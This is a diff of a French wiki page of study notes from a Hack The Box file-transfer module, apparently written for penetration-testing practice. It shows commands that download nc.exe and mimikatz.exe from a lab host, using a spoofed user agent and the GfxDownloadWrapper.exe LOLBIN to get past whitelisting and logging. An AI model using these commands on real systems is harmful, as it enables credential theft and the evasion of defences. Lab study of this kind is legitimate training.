@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-05-04T16:11:56.817Z
+date: 2025-05-04T16:13:22.335Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -993,4 +993,11 @@ Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\U
 
 ### LOLBAS / GTFOBins
 
-L'application de liste blanche peut empêcher l'utilisation de PowerShell ou Netcat, et la journalisation des commandes peut alerter les défenseurs. Une alternative consiste à utiliser un "LOLBIN" (living off the land binary), également appelé "binaire de confiance mal placé". Un exemple est le pilote graphique Intel pour Windows 10 (GfxDownloadWrapper.exe), qui est installé sur certains systèmes et possède une fonctionnalité permettant de télécharger périodiquement des fichiers de configuration. Cette fonctionnalité peut être invoquée de la manière suivante :
+La liste blanche peut empêcher l'utilisation de PowerShell ou Netcat, et la journalisation des commandes peut créer des alertes.
+Une alternative consiste à utiliser un binaire LOLBIN, également appelé "binaire de confiance mal placé" (misplaced trust binaries).
+
+Un exemple est le pilote graphique Intel pour Windows 10 (GfxDownloadWrapper.exe), qui est installé sur certains systèmes et possède une fonctionnalité permettant de télécharger périodiquement des fichiers de configuration. Cela peut être utilisé de la manière suivante :
+
+```
+GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
